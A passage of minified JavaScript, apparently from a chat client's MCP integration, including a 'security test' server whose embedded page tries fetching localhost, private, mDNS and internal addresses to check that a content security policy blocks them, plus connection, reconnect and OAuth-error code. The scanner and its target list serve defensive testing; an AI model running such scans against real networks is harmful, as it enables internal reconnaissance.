(IPv4-mapped)"},{url:"http://[::ffff:192.168.1.1]:80/",name:"[::ffff:192.168.1.1] (IPv4-mapped)"},{url:"http://server.local:80/",name:"server.local (mDNS)"},{url:"http://app.localhost:3000/",name:"app.localhost"},{url:"http://api.internal:80/",name:"api.internal"},{url:"http://router.home.arpa:80/",name:"router.home.arpa (RFC 8375)"}];function M(){let e=new u.g({name:"MCP Apps Security Test",version:"1.0.0"},{capabilities:{tools:{},resources:{}},jsonSchemaValidator:l.hm});return e.setRequestHandler(m.gW,()=>({tools:[{name:"security_test_scanner",description:"[SECURITY TEST] Attempts to scan localhost and private network IPs - should be blocked by CSP fix. Optionally provide custom domains to test connectivity.",inputSchema:{type:"object",properties:{customDomains:{type:"array",items:{type:"string"},description:"Optional list of custom domains/URLs to test (e.g., ['https://example.com', 'http://myserver.local:8080'])"},skipDefaultScan:{type:"boolean",description:"If true, skip the default private IP scan and only test custom domains",default:!1}}},_meta:{"ui/resourceUri":I}}]})),e.setRequestHandler(m.FT,e=>{let{name:n,arguments:t}=e.params;if("security_test_scanner"===n){let e=(null==t?void 0:t.customDomains)||[],n=(null==t?void 0:t.skipDefaultScan)||!1;return{content:[{type:"text",text:"[SECURITY TEST] Scanner tool invoked.\n"+"Custom domains: ".concat(e.length>0?e.join(", "):"none","\n")+"Skip default scan: ".concat(n,"\n\n")+"The iframe will attempt to scan private network addresses. If the CSP fix is working, all private IP scans should fail."}]}}return{content:[{type:"text",text:"Unknown tool: ".concat(n)}],isError:!0}}),e.setRequestHandler(m.OI,()=>({resources:[{uri:I,name:"Security Test Scanner MCP App",description:"[SECURITY TEST] Attempts localhost port scanning - should be blocked",mimeType:"text/html;profile=mcp-app"}]})),e.setRequestHandler(m.R6,e=>{let{uri:n}=e.params;if(n===I)return{contents:[{uri:I,mimeType:"text/html;profile=mcp-app",text:function(){let e=JSON.stringify(B);return'<!DOCTYPE html>\n<html lang="en">\n<head>\n  <meta charset="UTF-8" />\n  <meta name="viewport" content="width=device-width, initial-scale=1.0" />\n  <title>Security Test Scanner</title>\n  <style>\n    * { box-sizing: border-box; margin: 0; padding: 0; }\n    body {\n      font-family: system-ui, -apple-system, sans-serif;\n      padding: 1rem;\n      background: transparent;\n    }\n    .container {\n      max-width: 700px;\n    }\n    h1 {\n      font-size: 1.25rem;\n      margin-bottom: 0.5rem;\n      color: #dc2626;\n    }\n    .warning {\n      background: #fef2f2;\n      border: 1px solid #dc2626;\n      padding: 0.75rem;\n      border-radius: 6px;\n      margin-bottom: 1rem;\n      font-size: 0.875rem;\n      color: #991b1b;\n    }\n    .controls {\n      margin-bottom: 1rem;\n      padding: 0.75rem;\n      background: #f3f4f6;\n      border-radius: 6px;\n    }\n    .controls label {\n      display: block;\n      margin-bottom: 0.5rem;\n      font-size: 0.875rem;\n      font-weight: 500;\n    }\n    .controls input[type="text"] {\n      width: 100%;\n      padding: 0.5rem;\n      border: 1px solid #d1d5db;\n      border-radius: 4px;\n      font-size: 0.875rem;\n      margin-bottom: 0.5rem;\n    }\n    .controls button {\n      padding: 0.5rem 1rem;\n      background: #3b82f6;\n      color: white;\n      border: none;\n      border-radius: 4px;\n      cursor: pointer;\n      font-size: 0.875rem;\n      margin-right: 0.5rem;\n    }\n    .controls button:hover { background: #2563eb; }\n    .controls button.danger { background: #dc2626; }\n    .controls button.danger:hover { background: #b91c1c; }\n    .results {\n      font-family: monospace;\n      font-size: 0.7rem;\n      background: #1a1a1a;\n      color: #22c55e;\n      padding: 1rem;\n      border-radius: 6px;\n      max-height: 500px;\n      overflow-y: auto;\n    }\n    .log-entry {\n      margin-bottom: 0.2rem;\n      white-space: pre-wrap;\n      word-break: break-all;\n    }\n    .log-entry.error { color: #ef4444; }\n    .log-entry.success { color: #22c55e; }\n    .log-entry.blocked { color: #f59e0b; }\n    .log-entry.info { color: #60a5fa; }\n    .log-entry.header { color: #a78bfa; font-weight: bold; }\n    .summary {\n      margin-top: 1rem;\n      padding: 0.75rem;\n      background: #1e293b;\n      border-radius: 6px;\n      font-size: 0.875rem;\n    }\n    .summary .vulnerable { color: #ef4444; font-weight: bold; }\n    .summary .blocked { color: #22c55e; font-weight: bold; }\n  </style>\n</head>\n<body>\n  <div class="container">\n    <h1>Private Network Access Vulnerability Test</h1>\n    <div class="warning">\n      This security test attempts to access localhost, private IPs, and cloud metadata endpoints.\n      If the CSP fix is working correctly, all private network scans should be BLOCKED.\n    </div>\n\n    <div class="controls">\n      <label>Test Custom Domain (optional):</label>\n      <input type="text" id="customUrl" placeholder="e.g., http://myserver.local:8080 or https://example.com" />\n      <button id="testCustomBtn">Test Custom URL</button>\n      <button id="runDefaultBtn" class="danger">Run Full Scan</button>\n    </div>\n\n    <div class="results" id="results">\n      <div class="log-entry info">[*] Security test ready. Click "Run Full Scan" or test a custom URL.</div>\n    </div>\n\n    <div class="summary" id="summary" style="display: none;">\n      <div>Scan Complete:</div>\n      <div>Vulnerable: <span class="vulnerable" id="vulnCount">0</span></div>\n      <div>Blocked by CSP: <span class="blocked" id="blockedCount">0</span></div>\n    </div>\n  </div>\n\n  <script type="module">\n'.concat('\n    const app = (() => {\n      let nextId = 1;\n\n      return {\n        sendRequest({ method, params }) {\n          const id = nextId++;\n          window.parent.postMessage({ jsonrpc: "2.0", id, method, params }, "*");\n          return new Promise((resolve, reject) => {\n            window.addEventListener("message", function listener(event) {\n              const data = event.data;\n              if (event.data?.id === id) {\n                window.removeEventListener("message", listener);\n                if (event.data?.result) {\n                  resolve(event.data.result);\n                } else if (event.data?.error) {\n                  reject(new Error(event.data.error));\n                }\n              }\n            });\n          });\n        },\n        sendNotification({ method, params }) {\n          window.parent.postMessage({ jsonrpc: "2.0", method, params }, "*");\n        },\n        onNotification(method, handler) {\n          window.addEventListener("message", function listener(event) {\n            if (event.data?.method === method) {\n              handler(event.data.params);\n            }\n          });\n        },\n        setupAutoResize() {\n          new ResizeObserver(() => {\n            const { body, documentElement: html } = document;\n            const htmlStyle = getComputedStyle(html);\n            const rect = body.getBoundingClientRect();\n            const width = Math.ceil(rect.width);\n            const height = Math.ceil(\n              rect.height +\n              (parseFloat(htmlStyle.borderTop) || 0) +\n              (parseFloat(htmlStyle.borderBottom) || 0)\n            );\n            this.sendNotification({\n              method: "ui/notifications/size-changed",\n              params: { width, height }\n            });\n          }).observe(document.body);\n        },\n      };\n    })();\n','\n    const IMPLEMENTATION = { name: "Security Test Scanner", version: "2.0.0" };\n\n    // Default scan targets - all the private IP ranges we protect against\n    const defaultTargets = ').concat(e,';\n\n    const resultsEl = document.getElementById("results");\n    const summaryEl = document.getElementById("summary");\n    const vulnCountEl = document.getElementById("vulnCount");\n    const blockedCountEl = document.getElementById("blockedCount");\n    const customUrlInput = document.getElementById("customUrl");\n    const testCustomBtn = document.getElementById("testCustomBtn");\n    const runDefaultBtn = document.getElementById("runDefaultBtn");\n\n    let customTargets = [];\n\n    function log(message, type = "info") {\n      const entry = document.createElement("div");\n      entry.className = "log-entry " + type;\n      const timestamp = new Date().toISOString().substr(11, 8);\n      entry.textContent = "[" + timestamp + "] " + message;\n      resultsEl.appendChild(entry);\n      resultsEl.scrollTop = resultsEl.scrollHeight;\n    }\n\n    function logHeader(message) {\n      log("\\n" + "=".repeat(60), "header");\n      log(message, "header");\n      log("=".repeat(60), "header");\n    }\n\n    async function scanUrl(url, name) {\n      log("[>] Testing: " + name, "info");\n      log("    URL: " + url, "info");\n\n      try {\n        const controller = new AbortController();\n        const timeout = setTimeout(() => controller.abort(), 3000);\n\n        const resp = await fetch(url, {\n          signal: controller.signal,\n          mode: "cors",\n        });\n        clearTimeout(timeout);\n\n        // If we get here, the CSP fix FAILED\n        const text = await resp.text();\n        log("[!] VULNERABLE: Connection succeeded!", "success");\n        log("    Status: " + resp.status, "success");\n        log("    Body: " + text.substring(0, 100), "success");\n        return { status: "vulnerable", response: resp.status, body: text.substring(0, 200) };\n\n      } catch (e) {\n        if (e.message.includes("Content Security Policy") ||\n            e.message.includes("CSP") ||\n            e.message.includes("Refused to connect") ||\n            e.message.includes("connect-src")) {\n          log("[+] BLOCKED by CSP: " + e.message.substring(0, 80), "blocked");\n          return { status: "blocked", error: e.message };\n        } else if (e.name === "AbortError") {\n          log("[-] Timeout (no response in 3s)", "error");\n          return { status: "timeout" };\n        } else if (e.message.includes("NetworkError") || e.message.includes("Failed to fetch")) {\n          log("[-] Network error (port closed or no CORS): " + e.message.substring(0, 50), "error");\n          return { status: "network_error", error: e.message };\n        } else {\n          log("[-] Error: " + e.message, "error");\n          return { status: "error", error: e.message };\n        }\n      }\n    }\n\n    async function runScan(targets, title) {\n      logHeader(title);\n      log("[*] Testing " + targets.length + " targets...", "info");\n\n      let vulnerableCount = 0;\n      let blockedCount = 0;\n      const results = {};\n\n      for (const target of targets) {\n        const result = await scanUrl(target.url, target.name);\n        results[target.url] = result;\n\n        if (result.status === "vulnerable") {\n          vulnerableCount++;\n        } else if (result.status === "blocked") {\n          blockedCount++;\n        }\n\n        // Small delay between scans\n        await new Promise(r => setTimeout(r, 50));\n      }\n\n      logHeader("SCAN COMPLETE");\n      log("[*] Vulnerable: " + vulnerableCount, vulnerableCount > 0 ? "success" : "info");\n      log("[*] Blocked by CSP: " + blockedCount, "blocked");\n      log("[*] Other errors: " + (targets.length - vulnerableCount - blockedCount), "error");\n\n      if (vulnerableCount > 0) {\n        log("\\n[!] WARNING: CSP fix may not be working correctly!", "success");\n        log("[!] Private network access was possible!", "success");\n      } else if (blockedCount > 0) {\n        log("\\n[+] SUCCESS: Private network access was blocked by CSP!", "blocked");\n      }\n\n      // Update summary\n      summaryEl.style.display = "block";\n      vulnCountEl.textContent = vulnerableCount;\n      blockedCountEl.textContent = blockedCount;\n\n      return results;\n    }\n\n    // Test custom URL\n    testCustomBtn.addEventListener("click", async () => {\n      const url = customUrlInput.value.trim();\n      if (!url) {\n        log("[!] Please enter a URL to test", "error");\n        return;\n      }\n\n      await runScan([{ url, name: "Custom: " + url }], "CUSTOM URL TEST");\n    });\n\n    // Run default scan\n    runDefaultBtn.addEventListener("click", async () => {\n      resultsEl.innerHTML = "";\n      summaryEl.style.display = "none";\n\n      // Include any custom targets from tool input\n      const allTargets = [...defaultTargets, ...customTargets];\n      await runScan(allTargets, "PRIVATE NETWORK ACCESS VULNERABILITY TEST");\n    });\n\n    // MCP App connection\n    let nextRequestId = 1;\n\n    async function connectToHost() {\n      try {\n        window.addEventListener("message", (event) => {\n          try {\n            const data = event.data;\n            if (data && data.jsonrpc === "2.0") {\n              if (data.id === 1 && data.result) {\n                const initializedNotification = {\n                  jsonrpc: "2.0",\n                  method: "ui/notifications/initialized",\n                  params: {}\n                };\n                window.parent.postMessage(initializedNotification, "*");\n              }\n            }\n          } catch (err) {\n            console.error("[SecurityTest] Error handling message:", err);\n          }\n        });\n\n        app.onNotification("ui/notifications/tool-input", (params) => {\n          const args = params?.arguments || {};\n\n          // Handle custom domains from tool input\n          if (args.customDomains && Array.isArray(args.customDomains)) {\n            customTargets = args.customDomains.map(url => ({\n              url,\n              name: "Custom: " + url\n            }));\n            log("[*] Received " + customTargets.length + " custom domains to test", "info");\n          }\n\n          // Auto-run scan if not skipping default\n          if (!args.skipDefaultScan) {\n            setTimeout(() => {\n              runDefaultBtn.click();\n            }, 500);\n          }\n        });\n\n        const initRequest = {\n          jsonrpc: "2.0",\n          id: nextRequestId++,\n          method: "ui/initialize",\n          params: {\n            protocolVersion: "2025-11-21",\n            appInfo: IMPLEMENTATION,\n            appCapabilities: {}\n          }\n        };\n        window.parent.postMessage(initRequest, "*");\n        app.setupAutoResize();\n\n      } catch (err) {\n        console.error("[SecurityTest] Failed to connect:", err);\n      }\n    }\n\n    connectToHost();\n  <\/script>\n</body>\n</html>')}(),_meta:{ui:{csp:{connectDomains:R}}}}]};throw Error("Unknown resource: ".concat(n))}),e}var N=t(0x18393fe29),D=t(0xac309a83),L=t(0x85e0fa34),F=t(0xe824fb1c),z=t(0xc6857cab);function H(){return(0,N.yz)()&&!z.env.DONT_USE_EXAMPLE_MCP}let U=(e,n)=>{let t=(0,D.fS)("claude_ai_unicode_sanitize_mcp_data");(0,r.useEffect)(()=>{!async function(){if(H()){let r=n(),[o,s]=L.W.createLinkedPair();(async()=>{await r.connect(s)})(),await (0,l.q_)(o).then(n=>{(0,F.jh)(e,n,void 0,!0),(0,F.fR)(e,n,t),(0,F.BG)(e,n),(0,F.zC)(e,n)})}}()},[t,e,n])},q=(e,n,t)=>{let o=(0,D.fS)(t),s=(0,D.fS)("claude_ai_unicode_sanitize_mcp_data"),a=o||H();(0,r.useEffect)(()=>{!async function(){if(a){let t=n(),[r,o]=L.W.createLinkedPair();(async()=>{await t.connect(o)})(),await (0,l.q_)(r).then(n=>{(0,F.jh)(e,n,void 0,!0),(0,F.fR)(e,n,s),(0,F.BG)(e,n),(0,F.zC)(e,n)})}}()},[a,s,e,n])};t(0x21e26ba67);var j=t(0xf32c56dd),O=t(0x10728a05e),V=t(0x2252bfeb8),W=t(0x9845e38c);function G(e){let n=(0,r.useRef)(e);return(0,r.useEffect)(()=>{n.current=e},[e]),(0,r.useCallback)(function(){for(var e=arguments.length,t=Array(e),r=0;r<e;r++)t[r]=arguments[r];return n.current(...t)},[])}var Y=t(0x1d0eef17),X=t(0x1dafb1ccf);class K{start(){return this._port.onmessage=e=>{var n;null==(n=this.onmessage)||n.call(this,e.data)},this._port.onmessageerror=e=>{var n;null==(n=this.onerror)||n.call(this,Error("MessagePort message error: ".concat(e.data)))},Promise.resolve()}close(){var e;return this._port.close(),null==(e=this.onclose)||e.call(this),Promise.resolve()}send(e){return this._port.postMessage(e),Promise.resolve()}constructor(e){this._port=e}}let J=()=>{let{track:e}=(0,j.st)(),n=G(e),t=(0,r.useCallback)(e=>{n({event_key:"mcp.websocket.authfailure",server_uuid:e})},[n]),o=(0,r.useCallback)((e,t)=>{n({event_key:"mcp.websocket.transport.connection.failed",server_uuid:e,used_authentication:t})},[n]),s=(0,r.useCallback)(e=>{n({event_key:"mcp.tools.listed",tool_count_on_server:e})},[n]),a=(0,r.useCallback)(e=>{n({event_key:"mcp.resources.listed",resource_count_on_server:e})},[n]),i=(0,r.useCallback)(e=>{n({event_key:"mcp.prompts.listed",prompt_count_on_server:e})},[n]);return(0,r.useMemo)(()=>({trackMcpServerAuthFailure:t,trackMcpServerConnectionFailed:o,trackMcpToolsListed:s,trackMcpResourcesListed:a,trackMcpPromptsListed:i}),[t,o,s,a,i])},Q=Symbol();async function $(e){let n=new K(e);return(0,l.q_)(n)}var Z=t(0x62983db6),ee=t(0x20b939f38),en=t(0x244aea38b),et=t(0x2008941a4),er=t(0x1774d842),eo=t(0x253a5c787),es=t(0x1d302b010),ea=t(0x8475f78a),ei=t(0x78b33fbd);class el extends Error{constructor(e){super(e||"Authentication error"),this.name="UnauthedError"}}class ec{start(){if(this._socket)throw Error("WebSocketClientTransport already started! If using Client class, note that connect() calls start() automatically.");return new Promise((e,n)=>{this._socket=new WebSocket(this._url,["mcp"]),this._socket.onerror=e=>{var t;let r="error"in e?e.error:Error("WebSocket error: ".concat(JSON.stringify(e)));n(r),null==(t=this.onerror)||t.call(this,r)},this._socket.onopen=()=>{e()},this._socket.onclose=e=>{var n;null==(n=this.onclose)||n.call(this)},this._socket.onmessage=e=>{var n,t,r,o,s;let a,i;try{a=JSON.parse(e.data)}catch(e){null==(t=this.onerror)||t.call(this,e);return}let l=a;if("mcp_unauthorized"===l.error_code){null==(r=this.onAuthError)||r.call(this,new el(l.error||"Authentication required"));return}try{i=m.OR.parse(a)}catch(e){null==(o=this.onerror)||o.call(this,e);return}let c=i;if("connected"===c.method&&c.params){null==(s=this.onConnect)||s.call(this,c.params.used_auth);return}null==(n=this.onmessage)||n.call(this,i)}})}async close(){var e;null==(e=this._socket)||e.close()}send(e){return new Promise((n,t)=>{var r;if(!this._socket)return void t(Error("Not connected"));null==(r=this._socket)||r.send(JSON.stringify(e)),n()})}constructor(e){this._url=e}}class ed{async refreshClient(){return this.cachedClient=await this.getClient(),this.cachedClient}disconnectIfNoOngoingRequests(){this.cachedClient&&0===this.inflightRequestCount&&(this.cachedClient.close(),this.cachedClient=void 0)}clearTimeout(){this.debouncedDisconnectTimeout&&(clearTimeout(this.debouncedDisconnectTimeout),this.debouncedDisconnectTimeout=null)}beforeRequest(){this.inflightRequestCount++,this.clearTimeout()}afterRequest(){this.inflightRequestCount--,this.clearTimeout(),null!==this.disconnectTimeout&&(this.debouncedDisconnectTimeout=setTimeout(()=>{this.disconnectIfNoOngoingRequests()},this.disconnectTimeout))}async useClient(e){this.beforeRequest();try{return await e(await this.refreshClient())}finally{this.afterRequest()}}async initialize(){await this.refreshClient()}async connect(e){throw await Promise.resolve(),Error("Cannot call connect on a wrapped client")}async close(){var e;return null==(e=this.cachedClient)?void 0:e.close()}async registerCapabilities(e){return(await this.refreshClient()).registerCapabilities(e)}getServerCapabilities(){var e;return null==(e=this.cachedClient)?void 0:e.getServerCapabilities()}getServerVersion(){var e;return null==(e=this.cachedClient)?void 0:e.getServerVersion()}getInstructions(){var e;return null==(e=this.cachedClient)?void 0:e.getInstructions()}async ping(e){return(await this.refreshClient()).ping(e)}async complete(e,n){return this.useClient(t=>t.complete(e,n))}async setLoggingLevel(e,n){return this.useClient(t=>t.setLoggingLevel(e,n))}async getPrompt(e,n){return this.useClient(t=>t.getPrompt(e,n))}async listPrompts(e,n){return this.useClient(t=>t.listPrompts(e,n))}async listResources(e,n){return this.useClient(t=>t.listResources(e,n))}async listResourceTemplates(e,n){return this.useClient(t=>t.listResourceTemplates(e,n))}async readResource(e,n){return this.useClient(t=>t.readResource(e,n))}async subscribeResource(e,n){return this.useClient(t=>t.subscribeResource(e,n))}async unsubscribeResource(e,n){return this.useClient(t=>t.unsubscribeResource(e,n))}async callTool(e,n,t){return this.useClient(r=>r.callTool(e,n,t))}async listTools(e,n){return this.useClient(t=>t.listTools(e,n))}async sendRootsListChanged(){return this.useClient(e=>e.sendRootsListChanged())}async request(e,n,t){return this.useClient(r=>r.request(e,n,t))}async notification(e){return this.useClient(n=>n.notification(e))}async setRequestHandler(e,n){return(await this.refreshClient()).setRequestHandler(e,n)}async removeRequestHandler(e){return(await this.refreshClient()).removeRequestHandler(e)}async assertCanSetRequestHandler(e){return(await this.refreshClient()).assertCanSetRequestHandler(e)}async setNotificationHandler(e,n){return(await this.refreshClient()).setNotificationHandler(e,n)}async removeNotificationHandler(e){return(await this.refreshClient()).removeNotificationHandler(e)}async assertCapabilityForMethod(e){return(await this.refreshClient()).assertCapabilityForMethod(e)}async assertNotificationCapability(e){return(await this.refreshClient()).assertNotificationCapability(e)}async assertRequestHandlerCapability(e){return(await this.refreshClient()).assertRequestHandlerCapability(e)}get transport(){var e;return null==(e=this.cachedClient)?void 0:e.transport}constructor(e,n,t=null){this.getClient=e,this.cachedClient=n,this.disconnectTimeout=t,this.debouncedDisconnectTimeout=null,this.inflightRequestCount=0}}var ep=t(0xc6857cab);let eu={};async function em(e,n,t,r){let o=function(){if((0,N.yz)()){if(ep.env.NEXT_MCP_WEBSOCKET_PROXY)return ep.env.NEXT_MCP_WEBSOCKET_PROXY;if(window.claudeAppBindings)return"ws://localhost:4001";let e=ep.env.NEXT_PUBLIC_MCP_WEBSOCKET_BACKEND||"http://localhost:8000";if(null==e?void 0:e.startsWith("http"))return e.replace("http","ws");if(null==e?void 0:e.startsWith("ws"))return e.replace("https","wss")}return""}(),s=new ec("".concat(o,"/api/ws/organizations/").concat(e,"/mcp/servers/").concat(n,"/"));s.onAuthError=t,s.onConnect=r;let a=(0,l.UU)();return await a.connect(s),a}async function eh(e,n,t,r){let o="/v1/toolbox/shttp/mcp/".concat(n),s=new URL("".concat("").concat(o),window.location.origin),a=new er.j(s,{requestInit:{headers:{"x-organization-uuid":e,"x-mcp-client-session-id":n,"x-mcp-client-name":"ClaudeAI"},credentials:"include"}});a.onerror=e=>{e instanceof et.D_&&(null==t||t(e))};let i=(0,l.UU)();try{return await i.connect(a),null==r||r(!0),i}catch(e){throw e instanceof et.D_&&(null==t||t(e)),e}}var eg=t(0x4d348f95),ef=t(0x1ab0d1ca1);function ey(){let{servers:e}=(0,s.pL)();!function(e){let{activeOrganization:n}=(0,ee.YL)(),t=null==n?void 0:n.uuid,s=J(),a=function(){let{value:e}=(0,ei.useDynamicConfig)("apps_mcp_ws_reconnect_config");return e}(),i=(0,D.fS)("claude_ai_unicode_sanitize_mcp_data"),l=(0,o.p9)(),c=(0,es.s)(),{data:d,isLoading:p}=(0,es.eB)(t),u=l?void 0:d,m=null==a?void 0:a.reconnect_enabled,h=(null==a?void 0:a.disconnect_enabled)&&(null==a?void 0:a.disconnect_timeout)||null,g=(0,r.useCallback)(async(e,n)=>{var t,r;let o=eu[n.uuid]=(null!=(t=eu[n.uuid])?t:0)+1,a=e=>{var t;null==(t=(0,en.US)())||t.addError(e,{source:"mcp_remote_auth",serverUuid:n.uuid,serverName:n.name,serverUrl:n.url,connectionAttempt:o}),(0,eo.Cp)(e,{tags:{serverUuid:n.uuid,serverName:n.name}}),s.trackMcpServerAuthFailure(n.uuid),(0,F.Ug)(n.uuid)},l=e=>{(0,F.n3)(n.uuid,e),(async()=>{let e=await (0,F.xk)(n.uuid);if(!e){var t;let e=Error("Client is undefined after connection");null==(t=(0,en.US)())||t.addError(e,{source:"mcp_remote_client_undefined",serverUuid:n.uuid,serverName:n.name,serverUrl:n.url,connectionAttempt:o}),(0,eo.Cp)(e,{tags:{serverUuid:n.uuid,serverName:n.name}}),(0,F.Ug)(n.uuid);return}(0,F.MR)(n.uuid,e,i).then(e=>{s.trackMcpToolsListed(e.length)}),(0,F.k$)(n.uuid,e).then(e=>{s.trackMcpPromptsListed(e.length)}),(0,F.aF)(n.uuid,e).then(e=>{s.trackMcpResourcesListed(e.length)})})()};try{let t=async()=>{let t=await (0,F.xk)(n.uuid);if(t&&t&&(null==t?void 0:t.transport)!==void 0)return t;let r=c?eh(e,n.uuid,a,l):em(e,n.uuid,a,l);(0,F.kc)((0,ea.Ic)(n.uuid),r);let o=await r;return(0,F.kc)((0,ea.Ic)(n.uuid),o),o},r=await t(),o=m?function(e,n){let t=arguments.length>2&&void 0!==arguments[2]?arguments[2]:null;return new ed(e,n,t)}(async()=>t(),r,h):r;(0,F.kc)(n.uuid,o)}catch(e){e instanceof et.D_||(null==(r=(0,en.US)())||r.addError(e instanceof Error?e:Error(String(e)),{source:"mcp_remote_connection",serverUuid:n.uuid,serverName:n.name,serverUrl:n.url,connectionAttempt:o}),s.trackMcpServerConnectionFailed(n.uuid,!1)),(0,eo.Cp)(e,{tags:{serverUuid:n.uuid,serverName:n.name}}),(0,F.Ug)(n.uuid)}},[m,h,i,s,c]);(0,r.useEffect)(()=>{(0,F.pZ)(null!=p&&p),p||(0,F.IT)(!0)},[p]),(0,r.useEffect)(()=>{if(t&&u)for(let n of u)(0,F.s$)(n.uuid)&&((0,F.nd)(n.uuid)&&((0,F.rD)(n),(0,F.I3)(n.uuid,n.url,e)),g(t,n))},[u,g,t,l,e]),(0,r.useEffect)(()=>{if(t&&l)return F.eZ.subscribe((e,n)=>{for(let[r,o]of Object.entries(e.remoteConnectionStates)){let s=n.remoteConnectionStates[r],a=e.remoteServers[r];o.requiresWebSocket&&!(null==s?void 0:s.requiresWebSocket)&&a&&(e.remoteClients[r]||e.remoteClients[(0,ea.Ic)(r)]||g(t,a))}})},[t,l,g])}(e),(0,o.oQ)();let n=(0,F.eZ)(e=>e.remoteServers);return(0,r.useEffect)(()=>{let t=F.eZ.getState().remoteDirectories;for(let[r,o]of Object.entries(n))!t[r]&&o.url&&(0,F.I3)(r,o.url,e)},[n,e]),!function(){let{addError:e}=(0,O.Yf)(),{track:n}=(0,j.st)(),t=G(n),o=J(),s=(0,D.fS)("claude_ai_unicode_sanitize_mcp_data"),a=(0,X.Ev)(),[i,l]=(0,r.useState)(Q);(0,r.useEffect)(()=>{a||(0,F.H)(X.cN)},[a]);let c=(0,r.useCallback)(n=>{(!(0,X.Ns)({name:n})||a)&&((0,F.dY)(n)||window.claudeAppBindings.connectToMcpServer(n).catch(t=>{W.v.error(W.u.MCP,"Could not connect to MCP server ".concat(n),t),e("Could not connect to MCP server ".concat(n),{error:t})}))},[e,a]);(0,r.useEffect)(()=>{let e=!1;return(async()=>{var n,r;if(!(null==(n=window.claudeAppBindings)?void 0:n.listMcpServers)||!(null==(r=window.claudeAppBindings)?void 0:r.connectToMcpServer))return;i===Q&&(0,F.kU)(!0);let o=await window.claudeAppBindings.listMcpServers();if(t({event_key:"mcp.servers.listed",server_count:o.length}),(0,F.kU)(!1),!e)for(let e of o)c(e)})(),()=>{e=!0}},[c,t,i]);let d=(0,r.useCallback)(n=>{if(n.source!==window||!n.data)return;let{type:r,serverName:i,uuid:c}=n.data;if("mcp-server-auto-reconnect"===r&&i){(0,F.H)(i),l(Symbol());return}if("mcp-server-connected"!==r||!i||(0,X.Ns)({name:i})&&!a)return;let[d]=n.ports;$(d).then(e=>{(0,F.jh)(i,e,c),(0,F.fR)(i,e,s).then(e=>{o.trackMcpToolsListed(e.length)}),(0,F.BG)(i,e).then(e=>{o.trackMcpPromptsListed(e.length)}),(0,F.zC)(i,e).then(e=>{o.trackMcpResourcesListed(e.length)}),t({event_key:"mcp.servers.connected",result:"success"})},n=>{(0,F.dY)(c||i)||(e("Could not attach to MCP server ".concat(i),{error:n}),t({event_key:"mcp.servers.connected",result:"failure"}))})},[e,t,s,o,a]);(0,Y.M)("message",d),(0,r.useEffect)(()=>{(async()=>{try{var e;let n=await (null===V.Fd||void 0===V.Fd||null==(e=V.Fd.getInstalledExtensionsWithState)?void 0:e.call(V.Fd));null==n||n.forEach(e=>{var n;(0,F.yt)(null!=(n=e.manifest.display_name)?n:e.manifest.name,e)})}catch(e){}})()},[])}(),U("exampleServer",p),U("elicitationServer",c),q("mcpAppsExample",P,"claudeai_mcp_apps_example_server"),q(F.Nu,b,"claudeai_mcp_apps_antfooding_server"),q("mcpAppsMaliciousExample",M,"claudeai_mcp_apps_malicious_server"),q("mcpAppsCspBypassExample",k,"claudeai_mcp_apps_csp_bypass_server"),(0,d.h)(),(0,Z.R)(),!function(){let e=(0,ef.A)(),n=(0,eg.useSearchParams)(),{addError:t,addSuccess:o}=(0,O.Yf)(),s=n.get("server"),a=n.get("step"),i=n.get("flow_id"),l=n.get("oauth_error"),c=n.get("oauth_error_description"),d=n.get("oauth_error_uri"),{track:p}=(0,j.st)();(0,r.useEffect)(()=>{let n=(0,F.et)(s||""),r=null==n?void 0:n.name;if(a&&(r||"success"!==a)){let u=r||"the MCP server";s&&p({event_key:"claudeai.mcp.auth.completed",result:a,uuid:s,url:null==n?void 0:n.url});let m="";l&&(m=" (".concat(l),c&&(m+=": ".concat(c)),d&&(m+=", ".concat(d)),m+=")");let h=i?' If this persists, share this reference with support: "'.concat(i,'"'):"";switch(a){case"success":o(e.formatMessage({defaultMessage:"Connected to {serverName}.",id:"WdZqvX3coc"},{serverName:u}));break;case"start_error":t(e.formatMessage({defaultMessage:"There was an error connecting to {serverName}. Please check your server URL and make sure your server handles auth correctly.",id:"pwACugMrqk"},{serverName:u})+h,{messageForLogging:"There was an error connecting to {serverName}. Please check your server URL and make sure your server handles auth correctly."});break;case"end_error":t(e.formatMessage({defaultMessage:"Error connecting to {serverName}. Please confirm that you have permission to access the service, that you're using the correct credentials, and that your server handles auth correctly.",id:"4iaqJE6vWb"},{serverName:u})+m+h,{messageForLogging:"Error connecting to {serverName}. Please confirm that you have permission to access the service, that you're using the correct credentials, and that your server handles auth correctly."});break;default:t(e.formatMessage({defaultMessage:"An unknown error occurred connecting to {serverName}.",id:"dURdJpCNlT"},{serverName:u})+h,{messageForLogging:"An unknown error occurred connecting to {serverName}."})}let g=new URL(window.location.href);g.searchParams.delete("server"),g.searchParams.delete("step"),g.searchParams.delete("flow_id"),window.history.replaceState({},"",g)}},[s,a,i,l,c,d,e,t,o,p])}(),null}}}]);